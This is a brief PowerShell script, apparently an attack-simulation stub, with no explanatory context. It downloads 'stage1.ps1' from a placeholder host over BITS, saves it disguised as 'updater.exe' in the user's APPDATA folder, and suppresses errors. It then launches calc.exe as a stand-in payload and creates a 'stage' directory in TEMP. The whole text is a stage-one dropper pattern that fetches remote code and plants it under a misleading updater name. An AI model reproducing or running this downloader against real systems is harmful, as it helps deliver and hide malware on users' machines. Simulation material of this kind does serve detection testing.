
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://contoso.com:80/stage1.ps1",
    [string]$DropPath = "$env:APPDATA\updater.exe",
    [int]$TimeoutSec = 207
)
try { Start-BitsTransfer -Source $DownloadUrl -Destination $DropPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Remote fetch failed" }
